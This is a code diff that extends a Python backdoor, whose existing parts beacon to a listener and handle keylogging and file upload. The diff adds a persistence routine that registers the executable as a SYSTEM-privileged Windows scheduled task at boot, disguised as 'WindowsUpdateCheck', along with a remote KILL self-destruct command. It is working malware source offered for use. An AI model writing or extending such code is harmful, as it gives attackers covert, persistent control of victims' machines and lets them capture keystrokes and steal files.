@@ -8,6 +8,7 @@ import getpass
 import os
 import socket
 import platform
+import sys
 import time
 import threading
 import subprocess
@@ -64,6 +65,29 @@ def connect_client():
 def send_beacon(sock):
   beacon = f"BKDR_ALIVE|{platform.node()}|{getpass.getuser()}|{'ADMIN' if os.name=='nt' else 'USER'}|{platform.system()}"
   sock.send(beacon.encode("utf-8"))
+
+# Self destruct function to cleanly exit the backdoor when a KILL command is received.
+# Preconditions: sock is a connected socket, and the KILL command is received.
+# Postconditions: Sends acknowledgment to listener and terminates the process.
+# Pseudocode:
+# 1. Turn off keylogger if runnning
+# 2. Print shutdown message and send KILL_ACK to listener
+# 3. Wait briefly to ensure message is sent
+# 4. Exit the process using os._exit(0) for a clean shutdown
+def self_destruct(sock):
+    try:
+        global loggerIsRunning
+        loggerIsRunning = False 
+        
+        print("[!] KILL command received. Shutting down backdoor...")
+        sock.send(b"KILL_ACK|Backdoor shutting down...")
+        time.sleep(1)
+        
+        os._exit(0) 
+
+    except Exception as e:
+        print(f"[!] Error during shutdown: {e}")
+        os._exit(1)
 
 ###
 ### Keylogger functions
@@ -240,7 +264,39 @@ def upload_file(filename, sock):
     print(f"[!] {error_msg}")
     sock.send(f"UPLOAD_ERR|{error_msg}".encode("utf-8"))
 
+###
+### Persistence function
+###
 
+# Installs persistence by creating a scheduled task that runs the backdoor at system startup with SYSTEM privileges.
+# Preconditions: sock is a connected socket, and the backdoor has permission to create scheduled tasks
+# Postconditions: A scheduled task is created, and a success or error message is sent back to the listener.
+# Pseudocode:
+# 1. Get the full path of the current executable
+# 2. Define a task name (disguised as a legitimate Windows process)
+# 3. Create a command to establish a scheduled task that runs at boot with SYSTEM privileges
+# 4. Execute the command and handle the result
+# 5. Send success or error message back to the listener
+def install_persistence(sock):
+  try:
+    exe_path = os.path.abspath(sys.argv[0])
+    task_name = "WindowsUpdateCheck"
+    
+    cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onstart /ru SYSTEM /f /rl HIGHEST'
+    
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+    
+    if result.returncode == 0:
+      print(f"[+] Persistence installed successfully via Scheduled Task: {task_name}")
+      sock.send(f"PERSIST_OK|Scheduled Task created: {task_name}".encode("utf-8"))
+    else:
+      print(f"[!] schtasks failed: {result.stderr}")
+      sock.send(f"PERSIST_ERR|{result.stderr}".encode("utf-8"))
+
+  except Exception as e:
+    error_msg = f"Persistence failed: {str(e)}"
+    print(f"[!] {error_msg}")
+    sock.send(f"PERSIST_ERR|{error_msg}".encode("utf-8"))
 
 ###
 ### Command Handler
@@ -297,6 +353,14 @@ def command_handler(sock):
         else:
           sock.send(b"CMD_ERR| No filename provided for upload")
 
+      # Persistence command
+      elif cmd.startswith("PERSIST"):
+        install_persistence(sock)
+
+      # Self destruct command
+      elif cmd.startswith("KILL"):
+        self_destruct(sock)
+        return 
 
       # Shell Command
       else:
